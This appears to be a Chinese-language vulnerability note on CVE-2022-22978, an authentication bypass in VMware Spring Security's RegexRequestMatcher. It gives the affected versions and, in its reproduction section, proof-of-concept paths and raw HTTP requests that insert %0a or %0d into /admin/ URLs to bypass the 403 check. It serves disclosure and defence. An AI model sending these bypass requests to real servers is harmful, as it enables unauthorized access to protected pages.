# VMware Spring Security 身份认证绕过漏洞 CVE-2022-22978

## 漏洞描述

VMware Spring Security是美国威睿（VMware）公司的一套为基于Spring的应用程序提供说明性安全保护的安全框架。VMware Spring Security存在授权问题漏洞，该漏洞源于在应用程序中使用 RegexRequestMatcher 以及正则表达式的通配符（**.**）处理不受信任的输入时存在输入验证错误。

参考链接：

- https://xz.aliyun.com/t/11473

## 漏洞影响

```
Spring Security 5.5.x < 5.5.7 
Spring Security 5.6.x < 5.6.4 
Spring Security 其他低版本同样受影响
```

## 漏洞复现

正常访问/admin/下任何路由均会提示403。

在/admin/下任何路由中，插入`%0a`或者`%0d`,即可绕过验证访问页面。

poc：

```
/admin/%0a%0d
```

例如：

```
GET /admin/%0atest HTTP/1.1
```

```
GET /admin/%0dtest HTTP/1.1
```

```
GET /admin/%0a%0d%0dtest HTTP/1.1
```

